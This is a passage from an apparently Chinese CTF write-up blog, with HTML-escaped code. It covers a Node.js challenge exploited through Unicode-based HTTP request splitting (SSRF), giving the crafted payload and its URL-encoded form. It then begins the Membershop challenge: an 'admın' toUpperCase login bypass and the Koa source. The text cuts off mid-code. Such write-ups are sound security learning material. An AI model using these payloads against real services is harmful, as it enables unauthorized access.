&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag/:token&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">params&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">token&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 长度大于10回显ip
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">writeFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public/temp/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 将flag写入public/temp/md5(ip+token)路径下 路径可控 但是访问本身受限 需要SSRF绕过
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;*&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendStatus&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">404&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>突破口在它使用的Node.js的版本恰好有上述SSRF的问题&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Node-js-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v8.12.0&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Express-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v4.16.3&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>入手点的代码代码就是这里了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205210752342.png" alt="image-20211205210752342">&lt;/p>
&lt;p>现在就说想办法绕过白名单的审查并构造payload；我们需要第一个请求指向&lt;code>/proxy/internal_website/public_notes&lt;/code>，第二个请求指向&lt;code>/flag/amiz&lt;/code>，让flag存在&lt;code>public/temp/md5(127.0.0.1amiz)&lt;/code>路径下&lt;/p>
&lt;pre tabindex="0">&lt;code>public_notes\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0166}\u{016c}\u{0161}\u{0167}/amiz
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/proxy/internal_website/public_notes%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2F%C5%A6%C5%AC%C5%A1%C5%A7%2Famiz
&lt;/code>&lt;/pre>&lt;h2 id="安洵杯-2019membershop">[安洵杯 2019]Membershop&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206224942653.png" alt="image-20211206224942653">&lt;/p>
&lt;p>admin会被过滤，那就先简单登入&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225301864.png" alt="image-20211206225301864">&lt;/p>
&lt;p>抓包后通过session可以看出是koa框架&lt;/p>
&lt;p>这里出题人说很容易联想到后端使用&lt;code>toUpperCase()&lt;/code>的转换，用拉丁文越权登录&lt;code>admın&lt;/code>，之前也有一次做题用到这个点了，但是在这里没有想起来，我的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206225648044.png" alt="image-20211206225648044">&lt;/p>
&lt;p>这下可以看源码了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">router&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-router&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-session&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">bodyParser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-bodyparser&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">isString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;underscore&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">isString&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">views&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-views&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-static&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">qs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;qs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">home&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">CONFIG&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;koa:sess&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">maxAge&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1800000&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">overwrite&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">httpOnly&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">signed&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rolling&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">renew&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkUser&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/admin/i&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/admin/i&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkUrl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;:3000/query&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;save&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;errorurl&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">filePath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;写入成功&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">DeleteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">filePath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
